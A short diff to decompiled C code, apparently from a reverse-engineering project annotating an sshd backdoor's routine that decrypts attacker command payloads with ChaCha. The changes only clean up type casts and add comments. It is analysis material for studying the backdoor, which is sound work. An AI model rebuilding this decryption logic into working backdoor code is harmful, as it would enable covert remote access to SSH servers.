@@ -36,7 +36,7 @@ BOOL decrypt_payload_message(key_payload_t *payload,size_t payload_size,global_c
   stack_padding_byte = 0;
   ciphertext_cursor = &body_length_stub;
   for (stack_wipe_rounds = 0x29; stack_wipe_rounds != 0; stack_wipe_rounds = stack_wipe_rounds + -1) {
-    *(undefined1 *)ciphertext_cursor = 0;
+    *(u8 *)ciphertext_cursor = 0;
     ciphertext_cursor = (u16 *)((long)ciphertext_cursor + 1);
   }
   if (payload == (key_payload_t *)0x0) {
@@ -54,7 +54,7 @@ BOOL decrypt_payload_message(key_payload_t *payload,size_t payload_size,global_c
     }
     if ((0x12 < payload_size) && (ctx->payload_state < 2)) {
       // AutoDoc: Stage the plaintext stride/index/bias header locally so ChaCha reuses the exact nonce sshd derived from the modulus chunk.
-      *(u64 *)&hdr.field0_0x0 = *(undefined8 *)&payload->field0_0x0;
+      *(u64 *)&hdr.field0_0x0 = *(u64 *)&payload->field0_0x0;
       hdr.field0_0x0.field1.cmd_type_bias = *(int64_t *)((long)&payload->field0_0x0 + 8);
       // AutoDoc: Recover the ChaCha key/IV pair from the encrypted secret blob before touching the ciphertext.
       decrypt_success = secret_data_get_decrypted((u8 *)&payload_keystream_seed,ctx);
